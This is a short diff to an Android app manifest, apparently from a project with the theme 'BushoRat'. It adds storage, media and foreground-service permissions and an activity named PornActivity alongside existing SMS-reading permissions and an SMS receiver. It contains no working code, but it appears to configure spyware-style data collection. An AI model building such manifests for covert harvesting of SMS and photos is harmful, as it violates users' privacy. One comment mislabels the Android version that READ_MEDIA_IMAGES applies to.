@@ -8,6 +8,11 @@
 
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" /> <!-- For Android < 13 -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+
+
 
     <application
         android:allowBackup="true"
@@ -19,6 +24,9 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.BushoRat"
         tools:targetApi="31">
+        <activity
+            android:name=".activities.PornActivity"
+            android:exported="false" />
         <activity
             android:name=".activities.DashboardActivity"
             android:exported="false" />
@@ -39,7 +47,7 @@
         </activity>
         <activity
             android:name=".MainActivity"
-            android:exported="true"></activity>
+            android:exported="true" />
 
         <receiver
             android:name=".reciever.SMSReceiver"
